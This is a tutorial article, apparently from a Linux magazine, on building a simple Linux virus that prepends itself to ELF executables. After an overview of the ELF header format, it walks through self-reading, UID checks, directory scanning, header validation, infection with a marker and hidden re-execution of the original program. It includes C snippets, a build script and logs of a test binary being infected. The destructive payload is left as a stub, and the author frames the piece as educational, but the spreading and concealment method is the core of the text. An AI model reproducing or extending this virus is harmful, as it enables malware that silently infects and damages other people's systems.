How to create a simple Linux ELF virus that can infect and propagate
through other ELF executables.
</p></div></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d14c8"></a></h2></div></div><p>
The history of computer viruses dates back to 1949 when Mr John von
Neumann, a lecturer at the University of Illinois, wrote a paper: &ldquo;Theory of
self-reproducing automata&rdquo;. That was just a research work, but since
then,
computer viruses have evolved dramatically. Apart from early systems,
the Microsoft Windows OS has been a primary target for computer virus
developers. Whether this is due to the number of people using that OS or the
number of loop holes it carries, the debate still remains open. For the past
two decades, the popularity of the Linux OS has grown in leaps and bounds with more
and more Web server machines running on Linux. Using Linux on a PC or
laptop is a growing trend. Linux's growing popularity poses the new
threat of it being vulnerable to virus attacks. Although the success of
existing Linux viruses has been limited, the threat still remains.
</p><p>
In this article, I discuss a particular category of Linux viruses
known as ELF viruses, but before doing that, first let me introduce some
basics that should help you understand the rest of the article.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d1730"></a>
What Is ELF?</h2></div></div><p>
ELF stands for Executable and Linkable Format. It is a standard file format
for object files, executables, shared libraries and core dumps. It became a
standard binary file format for UNIX (and UNIX-like systems) in 1999.
</p><p>
An ELF file begins with an ELF header, which is represented as the following
structure:

<pre class="programlisting">
#define EI_NIDENT       16
typedef struct {
          unsigned char e_ident[EI_NIDENT];
          Elf32_Half    e_type;
          Elf32_Half    e_machine;
          Elf32_Word    e_version;
          Elf32_Addr    e_entry;
          Elf32_Off     e_phoff;
          Elf32_Off     e_shoff;
          Elf32_Word    e_flags;
          Elf32_Half    e_ehsize;
          Elf32_Half    e_phentsize;
          Elf32_Half    e_phnum;
          Elf32_Half    e_shentsize;
          Elf32_Half    e_shnum;
          Elf32_Half    e_shstrndx;
 } Elf32_Ehdr;
</pre>
</p><p>
Here is the description of some of the basic elements in the structure
above:
</p><p>
1) e_ident: ELF has capabilities to support multiple processors, data
encodings, classes of machines and so forth. Now, to support all this, the ELF
header includes some initial bytes that specify how to interpret the file
independent of the file's contents and the processor on which the query is
made. The e_ident[] array in the previous structure corresponds to these
initial bytes. The following is the breakdown of the e_ident[] array:


<pre class="programlisting">
Name                 Value      Purpose

EI_MAG0                 0   File identification
EI_MAG1                 1   File identification
EI_MAG2                 2   File identification
EI_MAG3                 3   File identification
EI_CLASS                4   File class
EI_DATA                 5   Data encoding
EI_VERSION              6   File version
EI_PAD                  7   Start of padding bytes
EI_NIDENT              16   Size of e_ident[]
</pre>
</p><p>
EI_MAG0 to EI_MAG3 hold a magic number consisting of the following four bytes:
                   
<pre class="programlisting">
'0x7f', 'E', 'L', 'F'
</pre>
</p><p>
These four magical bytes help identify whether a file is of the ELF type or
not.
</p><p>
2) e_type: this value helps identify the type of ELF file:

<pre class="programlisting">
Name          Value    Meaning
                   
ET_NONE          0    No file type
ET_REL           1    Relocatable file
ET_EXEC          2    Executable file
ET_DYN           3    Shared object file
ET_CORE          4    Core file
ET_LOPROC   0xff00    Processor-specific
ET_HIPROC   0xffff    Processor-specific
</pre>
</p><p>
3) e_machine: this value helps identify the architecture for an ELF
file:

<pre class="programlisting">

Name          Value    Meaning                    
ET_NONE          0   No machine
EM_M32           1   AT&amp;T WE 32100
EM_SPARC         2   SPARC
EM_386           3   Intel Architecture
EM_68K           4   Motorola 68000
EM_88K           5   Motorola 88000
EM_860           7   Intel 80860
EM_MIPS          8   MIPS RS3000 Big-Endian
EM_MIPS_RS4_BE   10  MIPS RS4000 Big-Endian
RESERVED       11-16 Reserved for future use

</pre>
</p><p>
4) e_version: this value is used to identify the version of the object
file:

<pre class="programlisting">
Name       Value    Meaning
EV_NONE      0    Invalid version
EV_CURRENT   1    Current version
</pre>
</p><p>
The value 1 signifies the original file format; extensions will create new
versions
with higher numbers.

What Is an ELF Virus?</h2></div></div><p>
An ELF virus is a malicious piece of code that mainly targets ELF
executables and infects them in such a way that after being infected, either
these executables start behaving abnormally or carry out some things that
are invisible to the user. Most of the time, it's the latter of the two
characteristics (as mentioned earlier) that is prominent in infected ELF
executables, the most common being the invisible propagation of the virus
to fresh executables each time an infected executable is run. Now you can
easily understand that if an ELF virus somehow gains root access to a
system, it can cause havoc.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d1ec0"></a>
Types of ELF Viruses</h2></div></div><p>
Most ELF viruses are based on the Silvio Cesare File Virus. These can be
divided into two categories:
</p><div class="orderedlist"><ol type="1"><li><p>
A malicious piece of code that simply prepends itself to the start of
innocent executables.
</p></li><li><p>
A malicious piece of code that is injected into the text or data segment
of innocent executables.
</p></li></ol></div><p>
In this article, I focus on type 1 ELF viruses.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d21d8"></a>
The Virus: Explained</h2></div></div><p>
This virus, as mentioned previously, consists of a malicious piece of code that
prepends itself to the start of other executables. Now, because it completely
prepends itself to the start of other executables, so that it propagates
completely, it leaves the least dependency on its source of origin. This way, the
virus creates its own copy in all the executables it infects. 
</p><p>
This increases the life of the virus, because it would become very hard to
find all the executables that are infected until you know the infection
mechanism of the malicious code. Further, even if the source of the virus
is deleted, the virus propagation does not stop until all the infected
executables are cleaned/deleted.
</p><p>
Note: this virus would provide the propagation mechanism (that is, how it
infects the executable to propagate), but it would refrain from showing its
heart (that is, the piece of code that actually does something wrong with the
infected executable or the system as a whole). This is because I don't want
to encourage any newbie to directly copy and paste the virus and use it in
any destructive way.
</p><p>
The following is a brief description of how the virus works.
</p><p>
<span class="emphasis"><em>When run for the very first time or run from an infected executable,
here is what happens:</em></span>
</p><p>
1) As a very first step, it copies itself into memory. This is required, as
the virus would like to prepend itself to any ELF executable it encounters.
One important thing to note here is the size of the virus' compiled code.
This size is required in the code so as to read itself into memory. I have
defined a macro <tt>VIRUS_SIZE</tt> as a symbolic constant
for the size of the virus. 
</p><p>
The following code reads the virus into the memory:

<pre class="programlisting">
if (read(fd1, virus, VIRUS_SIZE) != VIRUS_SIZE) 
{
    printf("\n read() failed \n");
    return 1;
}
</pre>
</p><p>
One concern here is that if someone changes/adds/removes some code in the
original source in a way that the size of the compiled binary changes.
In that case, either manually change the value of the macro
<tt>VIRUS_SIZE</tt> and make it equal to the value spit out
by the command <tt>ls -l
&lt;name of the binary&gt;</tt>, or write a script that does this automatically every time for you. 
</p><p>
2) In the second step, the virus determines the effective user ID of the
user that has run this virus. This lets the logic determine whether the
virus was run by root or any other user. Based on this information, the code
decides which paths to search for ELF executables. The following line
in the code determines the effective user ID:

<pre class="programlisting">
uid = geteuid();
</pre>
</p><p>
3) In the third step, if the effective UID is that of root user, it starts
scanning the system directories (hard-coded in the code) where there could
be potential ELF executables present. If the effective UID is that of
any other user, the code starts scanning the user's login directory for any
vulnerable ELF executables:


<pre class="programlisting">

if(uid == 0) 
{
    /* Ohh...root powers...*/

    /* Add more system directories that contain important binaries*/
    //if(infections &lt; MAX_INFECT) searchForELF("/sbin", virus); 
    //infecting system paths like these can cause havoc.... :-) 
     
    if(infections &lt; MAX_INFECT)
        searchForELF("/home/himanshu/practice/elfvirus/filetoinfect",
virus); // added my own directory as I wanted only select files 
to be infected.
       
    launch_attack();
} 
else 
{
    /* The next two (commented) lines find the user's login directory
       and try to infect all the ELF executables it can */

    // info=*getpwuid(uid);       
    // if(infections &lt; MAX_INFECT) searchForELF(info.pw_dir, virus);

    if(infections &lt; MAX_INFECT)
        searchForELF("/home/himanshu/practice/elfvirus/filetoinfect",
virus); // added my own directory as I wanted only select files 
to be infected.
}

</pre>
</p><p>
4) In the fourth step, the code checks for any valid ELF by checking its
header. It checks the executable for things like
it should be an ELF type, it should be for the architecture that the virus itself is
compiled from, it should not be a core dump file and so on:


<pre class="programlisting">

if(hdr.e_ident[0] != ELFMAG0 || hdr.e_ident[1] != ELFMAG1 ||
hdr.e_ident[2] != ELFMAG2 ||hdr.e_ident[3] != ELFMAG3) 
{
    printf("\n Not an ELF file \n");
    return -1;
}

if (hdr.e_type != ET_EXEC &amp;&amp; hdr.e_type != ET_DYN)
{
    printf("\n Seems to be a core dump, skipping... \n");
    return -1;
}

</pre>
</p><p>
5) Once the ELF is verified by the code that it is a valid ELF that can be
infected, then:
</p><div class="itemizedlist"><ul type="disc"><li><p>
The code creates a temporary file and writes the buffer (compiled virus)
that was copied in first step (step 1 above) to the temporary file
created.
</p></li><li><p>
Reads the executable that is to be infected in memory and appends it to
the temporary file (created above).
</p></li><li><p>
Appends a magic number (to signify that the executable is infected) at the end
of this temporary file.
</p></li><li><p>
Changes the name of temp file so that it replaces the original
innocent executable file.
</p></li></ul></div><p>
So, in this step, the virus makes its first propagation to an executable. 
</p><p>
6) In the sixth step, if the virus was executed as root, it launches its most
dangerous piece of code&mdash;the payload through which destruction can be
done. As I have explained previously, this is a dummy function
<tt>launch_attack()</tt> in the code being discussed here, as I do not want to
promote copy-paste-execute behavior.
</p><p>
Now whenever this infected executable is launched, the virus follows all
these six steps again for infecting and propagating to other executables.
</p><p><span class="emphasis"><em>
If the virus is being executed from an infected executable, then
after all the six steps described above, there has to be way that the
infected executable that is launched should do its work correctly so that
the user doesn't even have an idea of what happened behind the scenes. So in
this case, the following steps (7&ndash;9) occur.</em></span>
</p><p>
7) In the seventh step, from the start of the executable, a seek to the end of
virus code (that is, a seek equivalent to VIRUS_SIZE) is done. From here, all
the bytes are copied (this would be compiled code of the actual executable) and
written to a temporary file. 
</p><p>
8) In the eighth step, the code forks a new process, executes this
temporary file and after execution, deletes the temporary file.
</p><p>
9) The user sees only that he or she executed a binary and that it executed fine.
</p><p>
Note: I have added some log statements to signify that the target
executable is infected.

Note: in the code in Listing 1, just change the path
/home/himanshu/practice/elfvirus/filetoinfect to the path where some
executables (that you want to infect) are kept in your machine.

Compiling the Virus</h2></div></div><p>
As I already mentioned, the value of the VIRUS_SIZE macro should be
equal to the size of the compiled code. Here is a script that will
automate the procedure:


<pre class="programlisting">
#!/bin/sh
gcc -o elfvirus elfvirus.c
FILESIZE=`ls -l elfvirus|awk '$5 {print $5}'`
PROGSIZE=`awk '/define VIRUS_SIZE/ {print $3}' elfvirus.c`
if [ $FILESIZE -eq $PROGSIZE ];then
        echo File sizes are correct...Ready to Roll!
else
        echo File size do not match!
        echo "Modifying source defines to VIRUS_SIZE $FILESIZE."
        awk ' {if(/define VIRUS_SIZE/) print "#define VIRUS_SIZE
"'$FILESIZE'; else print $0}' elfvirus.c &gt; elfvirus.c.new
        mv elfvirus.c elfvirus.c.bak
        mv elfvirus.c.new elfvirus.c
        ./create
fi
</pre>
</p><p>
Simply run the above script to compile the virus code.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x2888328"></a>
Output</h2></div></div><p>
I created a &ldquo;hello world&rdquo; executable in the directory where this virus
searches for executables to infect. 
The following is a capture from my machine:


<pre class="programlisting">
himanshu@himanshu-laptop ~/practice/elfvirus/filetoinfect $ gcc -Wall
hello.c -o hello
himanshu@himanshu-laptop ~/practice/elfvirus/filetoinfect $ ./hello

 Hello World
</pre>
</p><p>
As you can see, the ELF executable <tt>hello</tt>, when run,
outputs &ldquo;Hello
World&rdquo;.
</p><p>
Now, I run the virus code:


<pre class="programlisting">
himanshu@himanshu-laptop ~/practice/elfvirus $ ./elfvirus 

 Inside main 

 Inside searchForELF 

 Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/..] 
 It is a directory

 Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/.] 
 It is a directory

 Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/hello] 

 Inside infect 
***Infected /home/himanshu/practice/elfvirus/filetoinfect/hello.

 Virus executed from source and not from any infected executable. Exiting
gracefully
</pre>
</p><p>
The log statements said that the virus successfully infected
/home/himanshu/practice/elfvirus/filetoinfect/hello.
Now, when I again execute <tt>hello</tt>, kept at the same path, I see:


<pre class="programlisting">
himanshu@himanshu-laptop ~/practice/elfvirus/filetoinfect $ ./hello

 Inside main 

 Inside searchForELF 

 Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/..] 
 It is a directory

 Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/.] 
 It is a directory

 Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/hello] 

 Could not open [/home/himanshu/practice/elfvirus/filetoinfect/hello]

 Virus executed by an infected executable. Launching the executable now.

 Hello World
</pre>
</p><p>
So, it is clear from the above output that the virus has infected the
executable <tt>hello</tt>, which, when run now, will try to infect other executables
in the path mentioned in source code of the virus.

Conclusion</h2></div></div><p>
This article explains a basic ELF virus that prepends itself
before other executables and infects them. This article is first in its
series. My next article will show how to infect ELF by injecting code into text
or a data segment.
